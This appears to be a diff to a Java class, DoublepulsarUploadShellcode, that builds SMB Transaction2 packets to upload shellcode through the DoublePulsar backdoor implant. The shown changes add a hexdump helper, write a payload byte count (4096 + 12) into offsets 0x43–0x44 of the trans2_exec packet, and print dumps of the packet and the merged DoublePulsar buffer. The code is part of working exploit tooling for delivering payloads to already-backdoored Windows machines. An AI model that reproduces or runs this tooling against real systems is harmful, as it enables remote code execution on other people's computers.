@@ -61,6 +61,16 @@ public class DoublepulsarUploadShellcode {
                (data[0] & 0xFF);
     }
     
+    public static String hexdump(byte[] data) {
+    StringBuilder sb = new StringBuilder();
+    for (int i = 0; i < data.length; i++) {
+        if (i % 16 == 0) sb.append(String.format("%04X: ", i)); // address
+        sb.append(String.format("%02X ", data[i]));
+        if (i % 16 == 15) sb.append("\n"); // newline every 16 bytes
+    }
+    return sb.toString();
+}
+    
     public static void main(String[] args) {
         // Equivalent to unsigned char signature[] = { 0x79, 0xe7, 0xdf, 0x90 };
         byte[] signature = {(byte) 0x79, (byte) 0xE7, (byte) 0xDF, (byte) 0x90};
@@ -135,6 +145,13 @@ public class DoublepulsarUploadShellcode {
         int TotalSizeOfPayload = 4096; // 0x50D800
         int ChunkSize = 4096;
         int OffsetInPayload = 0;
+        
+        int byteCount = 4096 + 12; // Java 'int' is 32-bit, but that's fine
+
+        // Store byteCount into byteArray at offset 0x43 (67)
+        trans2_exec[0x43] = (byte) (byteCount & 0xFF);       // lower byte
+        trans2_exec[0x44] = (byte) ((byteCount >> 8) & 0xFF); // upper byte
+
 
         // Manually place TotalSizeOfPayload in little-endian
         Parameters[0] = (byte) (TotalSizeOfPayload);
@@ -287,5 +304,11 @@ public class DoublepulsarUploadShellcode {
         // Print out the merged array to verify (Optional)
         System.out.println("Merged byte array length: " + doublepulsar_packet.length);
     
+    
+        System.out.println("Hexdump of transaction 2 packet:  ");
+        System.out.println(hexdump(trans2_exec));
+        
+         System.out.println("Hexdump of byte buffer:  ");
+        System.out.println(hexdump(doublepulsar_packet));
     }
 }
